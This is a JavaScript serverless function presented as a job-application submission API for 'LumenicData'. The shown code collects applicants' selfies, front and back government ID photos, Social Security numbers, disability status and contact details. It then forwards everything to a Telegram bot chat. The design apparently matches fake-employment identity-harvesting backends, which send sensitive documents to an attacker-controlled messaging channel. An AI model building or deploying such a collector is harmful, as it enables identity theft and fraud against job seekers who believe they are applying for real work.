/**
 * LumenicData Application Submission API
 * ======================================
 * PRODUCTION-READY Serverless Function for Vercel
 * 
 * Features:
 * - Multipart/form-data file upload (NOT base64 - more efficient)
 * - iOS Safari & Android Chrome compatible
 * - Proper CORS handling
 * - Comprehensive error handling
 * - Detailed logging for debugging
 * 
 * Environment Variables:
 * - TG_BOT_TOKEN: Telegram bot token
 * - TG_CHAT_ID: Telegram chat/group ID
 */

const FormData = require('form-data');

// Telegram API
const TELEGRAM_API = 'https://api.telegram.org';

// File configuration
const FILE_CONFIG = {
  'a-selfie': { caption: '📸 Selfie Photo', isPhoto: true, required: true },
  'a-id-photo-front': { caption: '🪪 Government ID - FRONT', isPhoto: true, required: true },
  'a-id-photo-back': { caption: '🪪 Government ID - BACK', isPhoto: true, required: true },
  'a-cv': { caption: '📄 Resume/CV', isPhoto: false, required: false }
};

// CORS headers
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Accept, X-Requested-With',
  'Access-Control-Max-Age': '86400'
};

/**
 * Parse multipart form data manually (for Vercel)
 */
async function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      const buffer = Buffer.concat(chunks);
      resolve(buffer);
    });
    req.on('error', reject);
  });
}

/**
 * Simple multipart parser
 */
function parseMultipartBody(buffer, boundary) {
  const result = { fields: {}, files: {} };
  const parts = buffer.toString('binary').split('--' + boundary);
  
  for (const part of parts) {
    if (!part.includes('Content-Disposition')) continue;
    
    const headerEnd = part.indexOf('\r\n\r\n');
    if (headerEnd === -1) continue;
    
    const headers = part.substring(0, headerEnd);
    const content = part.substring(headerEnd + 4);
    
    // Extract field name
    const nameMatch = headers.match(/name="([^"]+)"/);
    if (!nameMatch) continue;
    const fieldName = nameMatch[1];
    
    // Check if it's a file
    const filenameMatch = headers.match(/filename="([^"]*)"/);
    
    if (filenameMatch) {
      // It's a file
      const contentTypeMatch = headers.match(/Content-Type:\s*([^\r\n]+)/i);
      const contentType = contentTypeMatch ? contentTypeMatch[1].trim() : 'application/octet-stream';
      
      // Extract binary content
      const binaryContent = content.replace(/\r\n$/, '');
      const fileBuffer = Buffer.from(binaryContent, 'binary');
      
      result.files[fieldName] = {
        name: filenameMatch[1],
        type: contentType,
        buffer: fileBuffer,
        size: fileBuffer.length
      };
    } else {
      // It's a field
      result.fields[fieldName] = content.replace(/\r\n$/, '');
    }
  }
  
  return result;
}

/**
 * Main handler
 */
module.exports = async function handler(req, res) {
  // Set CORS headers
  Object.entries(CORS_HEADERS).forEach(([key, value]) => {
    res.setHeader(key, value);
  });

  // Handle OPTIONS preflight
  if (req.method === 'OPTIONS') {
    console.log('[API] OPTIONS preflight request');
    return res.status(200).end();
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  console.log('\n========================================');
  console.log('[API] NEW SUBMISSION -', new Date().toISOString());
  console.log('========================================\n');

  try {
    // Get environment variables
    const BOT_TOKEN = (process.env.TG_BOT_TOKEN || '').trim();
    const CHAT_ID = (process.env.TG_CHAT_ID || '').trim();

    console.log('[API] Environment:');
    console.log('  TG_BOT_TOKEN:', BOT_TOKEN ? '✓ Set' : '✗ MISSING');
    console.log('  TG_CHAT_ID:', CHAT_ID ? '✓ Set' : '✗ MISSING');

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('[API] ✗ Missing environment variables');
      return res.status(503).json({
        success: false,
        error: 'Server not configured. Contact administrator.',
        details: { botToken: !!BOT_TOKEN, chatId: !!CHAT_ID }
      });
    }

    // Parse multipart form data
    let formData;
    const contentType = req.headers['content-type'] || '';
    
    if (contentType.includes('multipart/form-data')) {
      const boundaryMatch = contentType.match(/boundary=([^;]+)/);
      if (!boundaryMatch) {
        throw new Error('Missing boundary in Content-Type');
      }
      
      const boundary = boundaryMatch[1].trim().replace(/^"|"$/g, '');
      const rawBody = await parseMultipart(req);
      formData = parseMultipartBody(rawBody, boundary);
      
      console.log('[API] Parsed multipart form:');
      console.log('  Fields:', Object.keys(formData.fields));
      console.log('  Files:', Object.keys(formData.files));
      
      Object.entries(formData.files).forEach(([key, file]) => {
        console.log(`    ${key}: ${file.name} (${(file.size / 1024).toFixed(2)}KB)`);
      });
    } else if (contentType.includes('application/json')) {
      // Fallback for JSON (base64) uploads
      let bodyData = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      formData = {
        fields: bodyData.formData || {},
        files: {}
      };
      
      // Convert base64 files to buffers
      if (bodyData.files) {
        Object.entries(bodyData.files).forEach(([key, fileData]) => {
          if (fileData && fileData.data) {
            formData.files[key] = {
              name: fileData.name,
              type: fileData.type,
              buffer: Buffer.from(fileData.data, 'base64'),
              size: Buffer.from(fileData.data, 'base64').length
            };
          }
        });
      }
    } else {
      throw new Error('Unsupported Content-Type: ' + contentType);
    }

    // Step 1: Send form data as text message
    console.log('\n[API] Step 1: Sending text message...');
    
    const messageText = formatMessage(formData.fields);
    const messageUrl = `${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`;
    
    const messageRes = await fetch(messageUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const messageData = await messageRes.json();
    
    if (!messageData.ok) {
      throw new Error(`Telegram message failed: ${messageData.description}`);
    }
    
    console.log('[API] ✓ Text message sent (ID:', messageData.result?.message_id + ')');

    // Step 2: Upload files
    console.log('\n[API] Step 2: Uploading files...');
    
    const fileResults = [];
    const fileErrors = [];

    for (const [fieldName, file] of Object.entries(formData.files)) {
      const config = FILE_CONFIG[fieldName] || { 
        caption: `📎 ${fieldName}`, 
        isPhoto: file.type?.startsWith('image/'),
        required: false 
      };

      try {
        console.log(`\n[API] Uploading ${fieldName}:`);
        console.log(`  Name: ${file.name}`);
        console.log(`  Type: ${file.type}`);
        console.log(`  Size: ${(file.size / 1024).toFixed(2)}KB`);

        const isPhoto = config.isPhoto || file.type?.startsWith('image/');
        const endpoint = isPhoto ? 'sendPhoto' : 'sendDocument';
        const paramName = isPhoto ? 'photo' : 'document';

        const tgForm = new FormData();
        tgForm.append('chat_id', CHAT_ID);
        tgForm.append('caption', `${config.caption}\n${file.name}`);
        tgForm.append(paramName, file.buffer, {
          filename: file.name,
          contentType: file.type,
          knownLength: file.size
        });

        const fileUrl = `${TELEGRAM_API}/bot${BOT_TOKEN}/${endpoint}`;
        const fileRes = await fetch(fileUrl, {
          method: 'POST',
          body: tgForm,
          headers: tgForm.getHeaders()
        });

        const fileData = await fileRes.json();

        if (!fileData.ok) {
          throw new Error(fileData.description || 'Unknown error');
        }

        console.log(`[API] ✓ ${fieldName} uploaded successfully`);
        
        fileResults.push({
          field: fieldName,
          name: file.name,
          success: true
        });
      } catch (err) {
        console.error(`[API] ✗ ${fieldName} failed:`, err.message);
        fileErrors.push({
          field: fieldName,
          name: file.name,
          error: err.message
        });
      }
    }

    // Check required files
    const requiredFields = Object.entries(FILE_CONFIG)
      .filter(([_, c]) => c.required)
      .map(([f, _]) => f);
    
    const uploadedFields = fileResults.map(r => r.field);
    const missingRequired = requiredFields.filter(f => !uploadedFields.includes(f));

    console.log('\n[API] Summary:');
    console.log('  Files uploaded:', fileResults.length);
    console.log('  Files failed:', fileErrors.length);
    console.log('  Required missing:', missingRequired.length);

    if (missingRequired.length > 0) {
      return res.status(400).json({
        success: false,
        error: `Required files failed: ${missingRequired.join(', ')}`,
        fileErrors: fileErrors
      });
    }

    console.log('\n========================================');
    console.log('[API] ✓ SUBMISSION COMPLETE');
    console.log('========================================\n');

    return res.status(200).json({
      success: true,
      message: 'Application submitted successfully',
      filesUploaded: fileResults.length,
      files: fileResults.map(f => f.field)
    });

  } catch (error) {
    console.error('\n[API] ✗ CRITICAL ERROR:', error.message);
    console.error(error.stack);
    
    return res.status(500).json({
      success: false,
      error: error.message || 'Internal server error'
    });
  }
};

/**
 * Format form data for Telegram message
 */
function formatMessage(data) {
  let msg = '<b>📋 NEW APPLICATION</b>\n';
  msg += `<i>${new Date().toLocaleString()}</i>\n\n`;

  const sections = [
    { title: '<b>👤 Personal</b>', fields: [
      { k: 'a-fullname', l: 'Name' },
      { k: 'a-email', l: 'Email' },
      { k: 'a-phone', l: 'Phone' },
      { k: 'a-location', l: 'Location' },
      { k: 'a-linkedin', l: 'LinkedIn' },
      { k: 'a-portfolio', l: 'Portfolio' },
      { k: 'a-experience', l: 'Experience' }
    ]},
    { title: '<b>🏫 Education</b>', fields: [
      { k: 'a-highschool', l: 'School' },
      { k: 'a-highschool-status', l: 'Status' }
    ]},
    { title: '<b>💼 Position</b>', fields: [
      { k: 'a-role', l: 'Role' }
    ]},
    { title: '<b>🪪 Compliance</b>', fields: [
      { k: 'a-govid', l: 'ID Type' },
      { k: 'a-ssn', l: 'SSN' },
      { k: 'a-disability', l: 'Disability' }
    ]},
    { title: '<b>🎯 Skills</b>', fields: [
      { k: 'a-productive-time', l: 'Productive Hours' },
      { k: 'a-coding', l: 'Coding' },
      { k: 'a-excel-db', l: 'Excel/DB' },
      { k: 'a-availability', l: 'Availability' }
    ]},
    { title: '<b>📝 Other</b>', fields: [
      { k: 'a-cover', l: 'Cover Note' },
      { k: 'a-consent', l: 'Consent' }
    ]}
  ];

  for (const section of sections) {
    const lines = [];
    for (const { k, l } of section.fields) {
      if (data[k]) {
        const val = String(data[k]).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        lines.push(`• ${l}: ${val}`);
      }
    }
    if (lines.length) {
      msg += `${section.title}\n${lines.join('\n')}\n\n`;
    }
  }

  return msg;
}
